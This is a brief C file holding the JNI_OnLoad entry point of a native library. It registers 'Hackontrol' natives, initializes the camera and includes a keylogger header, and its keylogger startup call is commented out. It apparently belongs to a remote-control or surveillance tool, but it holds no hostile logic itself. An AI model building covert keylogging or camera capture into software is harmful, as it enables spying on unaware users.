#include <camera.h>
#include "register_native.h"
#include "keylogger.h"

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
	JNIEnv* environment = NULL;
	(*virtualMachine)->GetEnv(virtualMachine, (void**) &environment, JNI_VERSION_21);

	if(!environment) {
		return JNI_VERSION_21;
	}

	RegisterHackontrolNative(environment);
	//KeyLoggerInitialize(environment, virtualMachine);
	InitializeCamera(environment);
	return JNI_VERSION_21;
}
